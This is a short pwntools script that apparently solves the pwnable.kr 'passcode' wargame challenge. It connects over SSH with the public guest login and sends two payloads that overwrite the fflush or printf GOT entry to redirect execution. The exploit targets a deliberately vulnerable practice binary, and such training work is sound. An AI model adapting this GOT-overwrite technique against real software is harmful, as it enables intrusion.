from pwn import *

# ssh
sh = ssh(host='pwnable.kr', user='passcode',port= 2222, password='guest')
# process
passcode = sh.process('./passcode')

print("===============================================method1================================================")
# method1
# overwrite fflush_got

# address
fflush_got = p32(0x0804a004)
system_addr = str.encode(str(0x80485e3))

# payload
payload = b'a'*96 + fflush_got + system_addr
#print("payload = ", payload)

# Pwn
passcode.sendline(payload)
print(passcode.recvall())

print("===============================================method2================================================")

# method2
# overwrite printf_got

passcode = sh.process('./passcode')

# address
printf_got = p32(0x0804a000)
system_addr = str.encode(str(0x80485e3))

# payload
payload = b'a'*96 + printf_got + system_addr
#print("payload = ", payload)

# Pwn
passcode.sendline(payload)
print(passcode.recvall())

